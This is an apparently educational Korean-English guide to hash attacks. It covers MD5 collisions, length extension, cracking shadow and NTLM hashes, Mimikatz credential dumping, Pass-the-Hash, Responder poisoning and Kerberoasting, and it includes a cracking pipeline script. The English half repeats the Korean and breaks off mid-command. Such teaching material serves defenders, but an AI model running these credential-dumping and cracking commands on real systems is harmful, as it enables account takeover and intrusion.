# 해시 공격 기법 완전 정복

## 0. 초보자를 위한 개념 이해

### 해시 공격이란?

해시 함수는 임의 길이의 데이터를 고정 길이의 값(다이제스트)으로 변환하는 단방향 함수입니다. 패스워드 저장, 파일 무결성 검증, 디지털 서명에 필수적이지만, MD5·SHA-1처럼 취약한 알고리즘은 충돌(다른 입력이 같은 해시) 또는 무지개 테이블로 원문 복원이 가능합니다. 해시 공격 기술은 크래킹된 패스워드 DB 분석, 포렌식, CTF 암호학 문제에서 핵심 역량입니다.

**왜 배우는가:**
```
해시 취약점의 실제 영향:

  MD5 충돌 공격
    → 동일 MD5 해시를 가진 두 파일 생성 가능
    → AV 서명 우회, 파일 위변조 탐지 실패

  SHA-1 충돌 (SHAttered, 2017)
    → Google이 실제 SHA-1 충돌 증명
    → 인증서·서명 시스템 신뢰도 위협

  무염 MD5/SHA-1 패스워드 DB 유출
    → 레인보우 테이블로 수 초 내 대부분 크랙
    → 2012년 LinkedIn 해킹 (630만 SHA-1 해시 유출)

  bcrypt/Argon2 도입 이유:
    → 의도적으로 느린 키 파생 함수
    → GPU 크래킹 수십만 배 어렵게 만듦
```

### 핵심 개념 정리

```
해시 알고리즘 보안 현황:

  알고리즘   출력 크기   상태        특이사항
  ──────────────────────────────────────────────────
  MD5       128bit      파훼 (2004)  충돌 저항성 없음
  SHA-1     160bit      파훼 (2017)  SHAttered 공격
  SHA-256   256bit      안전         현재 표준
  SHA-3     256/512bit  안전         Keccak 기반
  bcrypt    60char      안전         패스워드 전용 (의도적 느림)
  Argon2    가변        안전         메모리 어렵 함수 (권장)

공격 유형:
  레인보우 테이블  — 해시→평문 사전 (salt 없으면 취약)
  딕셔너리 공격    — 자주 쓰는 패스워드 목록
  규칙 기반        — l33tspeak, 숫자 추가 등 변형 규칙
  마스크 공격      — 패턴 기반 (8자, 영문+숫자 등)
```

### 필요한 도구 및 환경
- **hashcat**: GPU 기반 고속 해시 크래킹 도구
- **john (John the Ripper)**: CPU 기반 패스워드 크래커
- **hashid**: 해시 유형 자동 식별 도구
- **CrackStation**: 온라인 해시 조회 서비스 (학습용)

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""해시 알고리즘 비교 및 패스워드 해싱 올바른 방법 실습."""

import hashlib
import time
import bcrypt
import os


def compare_hash_speed(password: str) -> dict[str, float]:
    """다양한 해시 알고리즘의 연산 속도를 비교합니다."""
    pw_bytes = password.encode()
    timings: dict[str, float] = {}

    # MD5 속도 (빠름 = 위험)
    start = time.perf_counter()
    for _ in range(100_000):
        hashlib.md5(pw_bytes).hexdigest()
    timings["MD5 × 100,000"] = time.perf_counter() - start

    # SHA-256 속도
    start = time.perf_counter()
    for _ in range(100_000):
        hashlib.sha256(pw_bytes).hexdigest()
    timings["SHA-256 × 100,000"] = time.perf_counter() - start

    # bcrypt 속도 (의도적으로 느림 = 안전)
    start = time.perf_counter()
    salt = bcrypt.gensalt(rounds=12)
    bcrypt.hashpw(pw_bytes, salt)
    timings["bcrypt (rounds=12) × 1"] = time.perf_counter() - start

    return timings


def secure_password_hash(password: str) -> tuple[bytes, bytes]:
    """패스워드를 안전하게 해싱합니다 (salt + SHA-256 키 파생)."""
    salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac(
        hash_name="sha256",
        password=password.encode(),
        salt=salt,
        iterations=600_000,  # NIST 2023 권고
    )
    return salt, key


if __name__ == "__main__":
    print("[해시 알고리즘 속도 비교]")
    timings = compare_hash_speed("password123")
    for algo, elapsed in timings.items():
        print(f"  {algo}: {elapsed:.3f}초")
    print("\n→ MD5/SHA-256은 너무 빨라 GPU 크래킹에 취약합니다.")
    print("→ 패스워드 저장에는 bcrypt/Argon2/PBKDF2를 사용하세요.")
```

---

## 해시 함수 보안 속성

```
암호학적 해시 함수의 3가지 속성:

1. 역상 저항성 (Preimage Resistance)
   H(m) = h 가 주어졌을 때 m을 찾기 어려움
   → 비밀번호 해시 보호

2. 제2역상 저항성 (Second Preimage Resistance)  
   m이 주어졌을 때 H(m') = H(m)인 다른 m' 찾기 어려움
   → 문서 위변조 방지

3. 충돌 저항성 (Collision Resistance)
   H(m1) = H(m2)인 m1 ≠ m2 쌍 찾기 어려움
   → 디지털 서명 보호

파훼 현황:
  MD5: 충돌 저항성 파훼 (1996), 실용적 공격 가능 (2004)
  SHA-1: 충돌 저항성 파훼 (2017, SHAttered)
  SHA-256/SHA-3: 현재까지 안전
```

---

## 1. MD5 충돌 공격

### MD5 충돌 실습

fastcoll 도구로 MD5 충돌 파일 쌍을 생성합니다. 동일한 MD5 해시를 가진 두 개의 다른 파일을 만들어 충돌 공격을 실증합니다.

```bash
# MD5 충돌 데모 파일 (fastcoll)
fastcoll -o collision1.bin collision2.bin

md5sum collision1.bin collision2.bin
# → 동일한 MD5 해시!

sha256sum collision1.bin collision2.bin
# → 다른 SHA-256 해시

# 실용적 활용: 악성코드 면역 AV (서명 기반)
# 정상 파일과 동일 MD5의 악성 파일 생성 가능
# → 파일 무결성 검증에 MD5 사용 금지!
```

### MD5 충돌을 이용한 공격

길이 확장 공격(Length Extension Attack)을 구현합니다. MD5/SHA-1/SHA-256의 내부 상태를 이용해 HMAC 없이 서명된 메시지를 위조합니다.

```python
# 길이 확장 공격 (Length Extension Attack)
# SHA-1, SHA-256, MD5의 취약점
# HMAC이 아닌 H(secret || message) 방식 MAC에 적용

import hashlib
import struct

def md5_pad(message: bytes) -> bytes:
    """MD5 패딩 추가"""
    length = len(message) * 8
    message += b'\x80'
    while len(message) % 64 != 56:
        message += b'\x00'
    message += struct.pack('<Q', length)
    return message

def md5_length_extension(
    original_hash: str,       # 알려진 H(secret || msg)
    original_msg: bytes,      # 알려진 msg
    secret_len: int,          # 추정되는 secret 길이
    additional_data: bytes    # 추가할 데이터
) -> tuple:
    """
    길이 확장 공격:
    H(secret || msg) → H(secret || msg || padding || additional)
    secret 없이 가능!
    """
    import hashpumpy
    
    # hashpumpy 라이브러리 사용
    new_hash, new_message = hashpumpy.hashpump(
        original_hash,
        original_msg,
        additional_data,
        secret_len
    )
    
    return new_hash, new_message

# 예시: 웹 앱에서 H(secret || username=admin)을 쿠키로 사용할 때
# 길이 확장으로 H(secret || username=admin || padding || &admin=true) 생성
```

---

## 2. 비밀번호 해시 공격

### 레인보우 테이블


레인보우 테이블은 해시 값에서 원본 패스워드를 역산하기 위해 미리 계산된 해시-패스워드 매핑 테이블입니다. Salt를 적용하면 레인보우 테이블 공격을 무력화할 수 있습니다.

```bash
# Ophcrack (Windows LM/NTLM)
ophcrack -g -d /usr/share/ophcrack/tables/ \
          -t XP_free_fast -f hash.txt

# RainbowCrack
rtgen md5 loweralpha-numeric 1 9 0 3800 33554432 0
rtsort *.rt
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99

# rcracki_mt (멀티스레드)
rcracki_mt -f hash.txt *.rt

# 온라인 레인보우 테이블
# crackstation.net
# md5decrypt.net
# hashes.com
```

### bcrypt/Argon2 크래킹 한계

bcrypt와 Argon2의 크래킹 한계를 보여줍니다. 의도적으로 느린 해시 함수는 GPU 병렬 처리를 크게 제한하여 브루트포스를 비실용적으로 만듭니다.

```bash
# bcrypt (느린 해시)
# $2y$12$... → cost factor 12
# 1초에 약 100번 시도 (GPU)
# RTX 3090: 약 184 H/s (매우 느림)

# 반면 MD5: RTX 3090에서 60,000 MH/s
# bcrypt 대비 327,000,000배 느림!

hashcat -m 3200 bcrypt.txt wordlist.txt
# -w 4 옵션으로 최대 성능

# Argon2 크래킹 (더 느림)
hashcat -m 13900 argon2.txt wordlist.txt

# 실용적 방어:
# bcrypt cost 12 이상 → 1초당 100회 이하
# 공격자 클라우드 비용: 10억번 시도 = $14,000+
```

### /etc/shadow 파일 공격

Linux /etc/shadow 파일의 해시 형식을 분석합니다. $6$는 SHA-512, $1$는 MD5 crypt 방식이며 john이나 hashcat으로 오프라인 크래킹 가능합니다.

```bash
# Linux 비밀번호 해시 형식
# $1$ = MD5Crypt
# $2a$/2y$/2b$ = bcrypt
# $5$ = SHA-256Crypt
# $6$ = SHA-512Crypt (권장)
# $y$ = yescrypt

# 예시 shadow 항목
# user:$6$rounds=5000$randomsalt$HASH:18000:0:99999:7:::

# john 크래킹
john --wordlist=wordlist.txt /etc/shadow
john --format=sha512crypt hash.txt --wordlist=rockyou.txt

# hashcat
# SHA-512Crypt 모드 (1800)
hashcat -m 1800 shadow_hashes.txt wordlist.txt

# 언섀도우 (passwd + shadow 결합)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

---

## 3. Windows 비밀번호 해시

### NTLM 해시 추출 및 크래킹

Windows SAM 데이터베이스에서 NTLM 해시를 추출하고 hashcat으로 크래킹합니다. Pass-the-Hash 공격에도 사용할 수 있습니다.

```bash
# SAM 데이터베이스에서 해시 추출
# 방법 1: Mimikatz (메모리에서)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam

# 방법 2: Volume Shadow Copy
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

# secretsdump.py (원격)
python3 secretsdump.py DOMAIN/USER:PASS@TARGET_IP

# NTLM 해시 크래킹
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
john --format=nt ntlm_hashes.txt --wordlist=rockyou.txt

# Pass-the-Hash (비밀번호 없이 해시로 인증)
python3 smbclient.py -hashes ':NTLM_HASH' DOMAIN/USER@TARGET
```

### NTLMv2 캡처 및 크래킹

Responder로 네트워크에서 NTLMv2 챌린지-응답을 캡처합니다. LLMNR/NBT-NS 포이즈닝으로 자격증명을 가로채는 중간자 공격입니다.

```bash
# Responder로 NTLMv2 캡처
sudo python3 Responder.py -I eth0 -wrf

# 캡처된 해시 크래킹
hashcat -m 5600 netntlmv2.txt rockyou.txt

# JohntheRipper
john netntlmv2.txt --wordlist=rockyou.txt --format=netntlmv2

# 크래킹 된 NTLMv2 예시
# Administrator::DOMAIN:CHALLENGE:RESPONSE:...
```

---

## 4. Kerberos 해시 공격

### Kerberoasting

Kerberos TGS 티켓을 요청하여 서비스 계정 해시를 추출합니다. SPN이 설정된 서비스 계정의 비밀번호를 오프라인으로 크래킹합니다.

```bash
# 서비스 티켓 요청 (SPN이 있는 서비스 계정)
# Impacket
python3 GetUserSPNs.py DOMAIN/USER:PASS@DC_IP -request

# PowerShell (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 캡처된 TGS 해시 크래킹
# $krb5tgs$23$... (RC4-HMAC) → mode 13100
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# $krb5tgs$18$... (AES256) → mode 19700
hashcat -m 19700 kerberoast_aes.txt wordlist.txt
```

### AS-REP Roasting

Kerberos 사전 인증이 비활성화된 계정의 AS-REP 응답에서 해시를 추출합니다. 도메인 사용자 열거 후 취약한 계정을 대상으로 합니다.

```bash
# Kerberos 사전 인증이 비활성화된 계정 대상
python3 GetNPUsers.py DOMAIN/ -usersfile users.txt \
    -format hashcat -outputfile asrep_hashes.txt \
    -dc-ip DC_IP

# 크래킹
# $krb5asrep$23$... → mode 18200
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

---

## 5. 해시 공격 자동화

다양한 해시 공격 기법을 자동화하는 Python 스크립트입니다. 해시 타입 식별부터 크래킹 도구 호출까지 파이프라인으로 처리합니다.

```python
#!/usr/bin/env python3
"""
해시 자동 크래킹 파이프라인 CLI
사용: python3 hash_cracker.py crack --hash 5f4dcc3b5aa765d61d8327deb882cf99
      python3 hash_cracker.py crack --file hashes.txt --wordlist rockyou.txt
      python3 hash_cracker.py identify --hash '$6$rounds=5000$salt$HASH'
"""

from __future__ import annotations
import argparse
import hashlib
import json
import re
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path


# ── 해시 패턴 정의 ───────────────────────────────────────────

HASH_SIGNATURES: list[tuple[str, str, int]] = [
    # (pattern, name, hashcat_mode)
    (r"^\$krb5tgs\$23\$.+",    "Kerberoast-RC4",   13100),
    (r"^\$krb5tgs\$18\$.+",    "Kerberoast-AES",   19700),
    (r"^\$krb5asrep\$23\$.+",  "AS-REP-RC4",       18200),
    (r"^\$krb5asrep\$18\$.+",  "AS-REP-AES",       19800),
    (r"^\$2[ayb]\$.{56}$",     "bcrypt",            3200),
    (r"^\$6\$.+",              "sha512crypt",        1800),
    (r"^\$5\$.+",              "sha256crypt",        7400),
    (r"^\$1\$.+",              "md5crypt",            500),
    (r"^\$y\$.+",              "yescrypt",           None),
    (r"^[a-f0-9]{128}$",       "SHA-512",            1700),
    (r"^[a-f0-9]{64}$",        "SHA-256",            1400),
    (r"^[a-f0-9]{56}$",        "SHA-224",            1300),
    (r"^[a-f0-9]{40}$",        "SHA-1",               100),
    (r"^[a-f0-9]{32}$",        "MD5/NTLM",            0),  # 0 → dict, 1000 도 시도
]

NTLM_EMPTY = "31d6cfe0d16ae931b73c59d7e0c089c0"


def identify_hash(h: str) -> list[tuple[str, int | None]]:
    """해시 문자열 → [(유형명, hashcat_mode), ...]"""
    results: list[tuple[str, int | None]] = []
    for pattern, name, mode in HASH_SIGNATURES:
        if re.match(pattern, h, re.IGNORECASE):
            results.append((name, mode))
            # 32자 16진수는 NTLM 모드도 추가
            if name == "MD5/NTLM":
                results.append(("NTLM", 1000))
    return results or [("Unknown", None)]


# ── 로컬 딕셔너리 크래커 ────────────────────────────────────

_DIGEST_FUNCS: dict[str, object] = {
    "md5":    hashlib.md5,
    "sha1":   hashlib.sha1,
    "sha256": hashlib.sha256,
    "sha512": hashlib.sha512,
}


def crack_local(hash_str: str, wordlist: Path,
                algo: str = "md5") -> str | None:
    """Python 순수 딕셔너리 크래킹 (MD5/SHA 계열)"""
    fn = _DIGEST_FUNCS.get(algo)
    if fn is None:
        return None
    h_lower = hash_str.lower()
    try:
        with wordlist.open("r", encoding="latin-1", errors="replace") as fp:
            for line in fp:
                word = line.rstrip("\n")
                if fn(word.encode()).hexdigest() == h_lower:
                    return word
    except OSError as e:
        print(f"[-] 워드리스트 오류: {e}", file=sys.stderr)
    return None


# ── Hashcat 래퍼 ─────────────────────────────────────────────

def crack_hashcat(
    hash_str: str,
    mode: int,
    wordlist: Path,
    rules: list[Path] | None = None,
    brute_mask: str | None = None,
    timeout: int = 300,
) -> str | None:
    """hashcat 실행 후 크래킹 결과 반환"""
    tmp = Path("/tmp/_hc_target.txt")
    tmp.write_text(hash_str + "\n")

    cmd = ["hashcat", "-m", str(mode), str(tmp), "--quiet",
           "--potfile-disable", "--status-timer=10"]

    if brute_mask:
        cmd += ["-a", "3", brute_mask]
    else:
        cmd += [str(wordlist)]
        for r in (rules or []):
            cmd += ["-r", str(r)]

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        # hashcat --show 로 결과 추출
        show = subprocess.run(
            ["hashcat", "-m", str(mode), str(tmp), "--show", "--potfile-disable"],
            capture_output=True, text=True, timeout=10,
        )
        for line in show.stdout.splitlines():
            if ":" in line:
                return line.split(":", 1)[-1].strip()
    except FileNotFoundError:
        print("[-] hashcat 미설치", file=sys.stderr)
    except subprocess.TimeoutExpired:
        print(f"[-] hashcat 타임아웃 ({timeout}s)", file=sys.stderr)
    return None


# ── 메인 크래킹 파이프라인 ───────────────────────────────────

@dataclass
class CrackResult:
    hash_str: str
    hash_type: str = "Unknown"
    password: str | None = None
    method: str = ""
    errors: list[str] = field(default_factory=list)


def crack_pipeline(
    hash_str: str,
    wordlist: Path,
    rules: list[Path] | None = None,
    use_hashcat: bool = True,
    timeout: int = 300,
) -> CrackResult:
    res = CrackResult(hash_str=hash_str)
    types = identify_hash(hash_str)
    res.hash_type = " / ".join(t for t, _ in types)
    print(f"[*] {hash_str[:32]}...  유형: {res.hash_type}")

    # 1. Python 로컬 크래킹 (MD5/SHA1)
    for name, _ in types:
        algo = {"MD5/NTLM": "md5", "SHA-1": "sha1",
                "SHA-256": "sha256", "SHA-512": "sha512"}.get(name)
        if algo:
            print(f"    [Python] {algo} 딕셔너리 크래킹...")
            pw = crack_local(hash_str, wordlist, algo)
            if pw:
                res.password, res.method = pw, f"python_{algo}"
                return res

    # 2. hashcat
    if use_hashcat:
        for name, mode in types:
            if mode is None:
                continue
            print(f"    [hashcat -m {mode}] 딕셔너리...")
            pw = crack_hashcat(hash_str, mode, wordlist, rules, timeout=timeout)
            if pw:
                res.password, res.method = pw, f"hashcat_dict_{name}"
                return res

            if mode in (0, 100, 1000, 1400):   # 빠른 해시만 브루트
                print(f"    [hashcat -m {mode}] 브루트 (6자리)...")
                pw = crack_hashcat(hash_str, mode, wordlist,
                                   brute_mask="?l?l?l?l?l?l", timeout=60)
                if pw:
                    res.password, res.method = pw, f"hashcat_brute_{name}"
                    return res

    print("    [-] 크래킹 실패")
    return res


# ── CLI ──────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="해시 크래킹 파이프라인")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # identify
    id_p = sub.add_parser("identify", help="해시 유형 식별")
    id_p.add_argument("--hash", required=True)

    # crack
    cr_p = sub.add_parser("crack", help="해시 크래킹")
    cr_p.add_argument("--hash", help="단일 해시")
    cr_p.add_argument("--file", type=Path, help="해시 목록 파일 (한 줄당 하나)")
    cr_p.add_argument("--wordlist", type=Path,
                      default=Path("/usr/share/wordlists/rockyou.txt"))
    cr_p.add_argument("--rules", nargs="*", type=Path)
    cr_p.add_argument("--no-hashcat", action="store_true")
    cr_p.add_argument("--timeout", type=int, default=300)
    cr_p.add_argument("--output", type=Path, help="결과 JSON 저장")

    args = parser.parse_args()

    if args.cmd == "identify":
        types = identify_hash(args.hash)
        print(f"해시: {args.hash}")
        for name, mode in types:
            hc = f"hashcat -m {mode}" if mode is not None else "N/A"
            print(f"  {name:20s}  {hc}")
        return

    hashes: list[str] = []
    if args.hash:
        hashes.append(args.hash)
    if args.file:
        try:
            hashes.extend(
                l.strip() for l in args.file.read_text().splitlines() if l.strip()
            )
        except OSError as e:
            print(f"[-] 파일 오류: {e}", file=sys.stderr)
            sys.exit(1)

    if not hashes:
        print("[-] --hash 또는 --file 을 지정하세요.", file=sys.stderr)
        sys.exit(1)

    results: list[dict] = []
    for h in hashes:
        res = crack_pipeline(
            h, args.wordlist, args.rules or [],
            not args.no_hashcat, args.timeout,
        )
        if res.password:
            print(f"[+] {res.hash_str[:32]}... → {res.password}  ({res.method})")
        results.append({"hash": res.hash_str, "type": res.hash_type,
                        "password": res.password, "method": res.method})

    if args.output:
        args.output.write_text(json.dumps(results, indent=2, ensure_ascii=False))
        print(f"[*] 결과 저장: {args.output}")

    cracked = sum(1 for r in results if r["password"])
    print(f"\n[요약] {cracked}/{len(results)} 크래킹 성공")


if __name__ == "__main__":
    main()
```

---

## 6. HMAC 및 MAC 공격

### 타이밍 공격

타이밍 공격(Timing Attack)은 연산 시간의 미세한 차이를 측정하여 비밀 정보를 유추합니다. 일반 문자열 비교 대신 상수 시간 비교 함수를 사용해야 합니다.

```python
#!/usr/bin/env python3
"""
타이밍 공격 데모 & 안전한 HMAC 비교
사용: python3 timing_attack.py demo
      python3 timing_attack.py safe-compare --a "abc" --b "abc"
"""

from __future__ import annotations
import argparse
import hmac
import statistics
import sys
import time


# ── 취약한 비교 (타이밍 공격 표적) ──────────────────────────

def vulnerable_compare(a: str, b: str) -> bool:
    """
    취약: 첫 불일치 문자에서 즉시 반환
    → 일치 바이트 수에 따라 실행 시간이 달라짐
    """
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False      # 조기 반환 → 시간 누출
    return True


# ── 상수 시간 비교 (안전) ─────────────────────────────────

def safe_compare(a: str, b: str) -> bool:
    """hmac.compare_digest — 항상 전체 비교, 시간 누출 없음"""
    return hmac.compare_digest(a.encode(), b.encode())


# ── 타이밍 공격 시뮬레이션 ───────────────────────────────────

def timing_attack(
    target: str,
    charset: str = "0123456789abcdef",
    samples: int = 200,
    verbose: bool = True,
) -> str:
    """
    vulnerable_compare 를 이용한 바이트 단위 타이밍 공격
    각 위치에서 가장 오래 걸리는 문자 = 일치하는 문자

    주의: 실제 네트워크 공격은 측정 노이즈가 훨씬 크므로
          수천~수만 샘플이 필요합니다.
    """
    recovered = ""

    for pos in range(len(target)):
        char_times: dict[str, float] = {}

        for ch in charset:
            guess = recovered + ch + "0" * (len(target) - len(recovered) - 1)
            measurements: list[int] = []

            for _ in range(samples):
                t0 = time.perf_counter_ns()
                vulnerable_compare(guess, target)
                t1 = time.perf_counter_ns()
                measurements.append(t1 - t0)

            # 중앙값 사용 (이상값 제거)
            char_times[ch] = statistics.median(measurements)

        best = max(char_times, key=char_times.get)
        recovered += best

        if verbose:
            top3 = sorted(char_times.items(), key=lambda kv: kv[1], reverse=True)[:3]
            print(f"  위치 {pos:02d}: '{best}'  복원: {recovered!r:20s}  "
                  f"상위3={[(c, f'{t:.0f}ns') for c, t in top3]}")

    return recovered


def run_demo() -> None:
    """취약 vs 안전 비교 데모"""
    secret_mac = "deadbeef1234"
    print(f"=== 타이밍 공격 데모 ===")
    print(f"실제 MAC: {secret_mac}\n")

    print("[*] 타이밍 공격 시작 (vulnerable_compare)...")
    recovered = timing_attack(secret_mac, samples=300)
    success = recovered == secret_mac
    print(f"\n[{'+'if success else '-'}] 복원 결과: {recovered!r}  "
          f"({'성공' if success else '실패'})\n")

    print("[*] safe_compare 정확성 확인")
    print(f"  올바른 MAC 비교: {safe_compare(secret_mac, secret_mac)}")
    print(f"  틀린 MAC 비교  : {safe_compare(secret_mac, 'deadbeef0000')}")


def main() -> None:
    parser = argparse.ArgumentParser(description="타이밍 공격 데모")
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("demo", help="취약 vs 안전 비교 데모 실행")

    atk = sub.add_parser("attack", help="타이밍 공격 실행")
    atk.add_argument("--target",  required=True, help="공격 대상 문자열")
    atk.add_argument("--charset", default="0123456789abcdef")
    atk.add_argument("--samples", type=int, default=200)

    cmp = sub.add_parser("safe-compare", help="상수 시간 비교")
    cmp.add_argument("--a", required=True)
    cmp.add_argument("--b", required=True)

    args = parser.parse_args()

    if args.cmd == "demo":
        run_demo()
    elif args.cmd == "attack":
        print(f"[*] 타이밍 공격: target={args.target!r}")
        result = timing_attack(args.target, args.charset, args.samples)
        print(f"\n[결과] {result!r}")
    elif args.cmd == "safe-compare":
        match = safe_compare(args.a, args.b)
        print(f"비교 결과: {'일치' if match else '불일치'}")
        sys.exit(0 if match else 1)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        run_demo()
    else:
        main()
```

---

## 7. 해시 보안 체크리스트

```
비밀번호 저장:
  □ bcrypt, Argon2id, scrypt 사용 (느린 해시)
  □ MD5, SHA-1, SHA-256 단독 사용 금지
  □ cost factor 주기적 증가 (하드웨어 발전에 따라)
  □ 솔트 자동 생성 (라이브러리가 처리)

MAC/서명:
  □ HMAC 사용 (단순 H(key || msg) 금지)
  □ hmac.compare_digest() 로 상수 시간 비교
  □ HMAC-SHA256 이상 사용

파일 무결성:
  □ SHA-256 이상 사용
  □ MD5/SHA-1 단독 사용 금지
  □ HMAC으로 키 기반 인증 포함 고려

인증서/서명:
  □ SHA-256 서명 알고리즘
  □ SHA-1 서명 인증서 거부
```

---

<a name="english"></a>

# Hash Attack Techniques — Complete Guide

## Hash Function Security Properties

```
Three properties of cryptographic hash functions:

1. Preimage Resistance
   Given H(m) = h, it is hard to find m
   → Protects password hashes

2. Second Preimage Resistance
   Given m, it is hard to find another m' such that H(m') = H(m)
   → Prevents document forgery

3. Collision Resistance
   It is hard to find m1 ≠ m2 such that H(m1) = H(m2)
   → Protects digital signatures

Current status of broken algorithms:
  MD5: Collision resistance broken (1996), practical attacks possible (2004)
  SHA-1: Collision resistance broken (2017, SHAttered)
  SHA-256/SHA-3: Currently secure
```

---

## 1. MD5 Collision Attacks

### MD5 Collision Lab

Generate a pair of MD5 collision files using the fastcoll tool. Demonstrates a collision attack by creating two different files with identical MD5 hashes.

```bash
# MD5 collision demo files (fastcoll)
fastcoll -o collision1.bin collision2.bin

md5sum collision1.bin collision2.bin
# → Identical MD5 hash!

sha256sum collision1.bin collision2.bin
# → Different SHA-256 hashes

# Practical use: AV evasion (signature-based)
# Possible to create a malicious file with the same MD5 as a legitimate file
# → Never use MD5 for file integrity verification!
```

### Exploiting MD5 Collisions

Implements a Length Extension Attack. Uses the internal state of MD5/SHA-1/SHA-256 to forge signed messages without HMAC.

```python
# Length Extension Attack
# Vulnerability in SHA-1, SHA-256, MD5
# Applies to MACs using H(secret || message) instead of HMAC

import hashlib
import struct

def md5_pad(message: bytes) -> bytes:
    """Add MD5 padding"""
    length = len(message) * 8
    message += b'\x80'
    while len(message) % 64 != 56:
        message += b'\x00'
    message += struct.pack('<Q', length)
    return message

def md5_length_extension(
    original_hash: str,       # Known H(secret || msg)
    original_msg: bytes,      # Known msg
    secret_len: int,          # Estimated secret length
    additional_data: bytes    # Data to append
) -> tuple:
    """
    Length extension attack:
    H(secret || msg) → H(secret || msg || padding || additional)
    Possible without the secret!
    """
    import hashpumpy
    
    # Using the hashpumpy library
    new_hash, new_message = hashpumpy.hashpump(
        original_hash,
        original_msg,
        additional_data,
        secret_len
    )
    
    return new_hash, new_message

# Example: When a web app uses H(secret || username=admin) as a cookie
# Use length extension to generate H(secret || username=admin || padding || &admin=true)
```

---

## 2. Password Hash Attacks

### Rainbow Tables

Rainbow tables are precomputed hash-to-password mapping tables used to reverse hash values back to original passwords. Applying a salt neutralizes rainbow table attacks.

```bash
# Ophcrack (Windows LM/NTLM)
ophcrack -g -d /usr/share/ophcrack/tables/ \
          -t XP_free_fast -f hash.txt

# RainbowCrack
rtgen md5 loweralpha-numeric 1 9 0 3800 33554432 0
rtsort *.rt
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99

# rcracki_mt (multi-threaded)
rcracki_mt -f hash.txt *.rt

# Online rainbow tables
# crackstation.net
# md5decrypt.net
# hashes.com
```

### Limits of bcrypt/Argon2 Cracking

Demonstrates the limits of cracking bcrypt and Argon2. Intentionally slow hash functions significantly limit GPU parallelism, making brute force impractical.

```bash
# bcrypt (slow hash)
# $2y$12$... → cost factor 12
# ~100 attempts per second (GPU)
# RTX 3090: ~184 H/s (very slow)

# By comparison, MD5 on RTX 3090: 60,000 MH/s
# 327,000,000x slower than bcrypt!

hashcat -m 3200 bcrypt.txt wordlist.txt
# Use -w 4 option for maximum performance

# Argon2 cracking (even slower)
hashcat -m 13900 argon2.txt wordlist.txt

# Practical defense:
# bcrypt cost 12+ → fewer than 100 attempts per second
# Attacker cloud cost: 1 billion attempts = $14,000+
```

### /etc/shadow File Attacks

Analyzes the hash format of Linux /etc/shadow files. $6$ is SHA-512Crypt, $1$ is MD5Crypt — can be cracked offline with john or hashcat.

```bash
# Linux password hash formats
# $1$ = MD5Crypt
# $2a$/2y$/2b$ = bcrypt
# $5$ = SHA-256Crypt
# $6$ = SHA-512Crypt (recommended)
# $y$ = yescrypt

# Example shadow entry
# user:$6$rounds=5000$randomsalt$HASH:18000:0:99999:7:::

# john cracking
john --wordlist=wordlist.txt /etc/shadow
john --format=sha512crypt hash.txt --wordlist=rockyou.txt

# hashcat
# SHA-512Crypt mode (1800)
hashcat -m 1800 shadow_hashes.txt wordlist.txt

# Unshadow (combine passwd + shadow)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

---

## 3. Windows Password Hashes

### NTLM Hash Extraction and Cracking

Extracts NTLM hashes from the Windows SAM database and cracks them with hashcat. Can also be used for Pass-the-Hash attacks.

```bash
# Extract hashes from SAM database
# Method 1: Mimikatz (from memory)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam

# Method 2: Volume Shadow Copy
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

# secretsdump.py (remote)
python3 secretsdump.py DOMAIN/USER:PASS@TARGET_IP

# NTLM hash cracking
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
john --format=nt ntlm_hashes.txt --wordlist=rockyou.txt

# Pass-the-Hash (authenticate with hash, no password needed)
python3 smbclient.py -hashes ':NTLM_HASH' DOMAIN/USER@TARGET
```

### NTLMv2 Capture and Cracking

Captures NTLMv2 challenge-responses from the network using Responder. A man-in-the-middle attack that intercepts credentials via LLMNR/NBT-NS poisoning.

```bash
# Capture NTLMv2 with Responder
sudo python3 Responder.py -I eth0 -wrf

# Crack captured hashes
hashcat -m 5600 netntlmv2.txt rockyou.txt

# JohntheRipper
john netntlmv2.txt --wordlist=rockyou.txt --format=netntlmv2

# Example of cracked NTLMv2
# Administrator::DOMAIN:CHALLENGE:RESPONSE:...
```

---

## 4. Kerberos Hash Attacks

### Kerberoasting

Requests Kerberos TGS tickets to extract service account hashes. Cracks the passwords of service accounts with SPNs configured, offline.

```bash
# Request service tickets (service accounts with SPN)
# Impacket
python3 GetUserSPNs.py DOMAIN/USER:PASS@DC_IP -request

# PowerShell (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack captured TGS hashes
# $krb5tgs$23$... (RC4-HMAC) → mode 13100
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# $krb5tgs$18$... (AES256) → mode 19700
hashcat -m 19700 kerberoast_aes.txt wordlist.txt
```

### AS-REP Roasting

Extracts hashes from AS-REP responses for accounts with Kerberos pre-authentication disabled. Targets vulnerable accounts after domain user enumeration.

```bash
# Target accounts with Kerberos pre-authentication disabled
python3 GetNPUsers.py DOMAIN/ -usersfile users.txt \
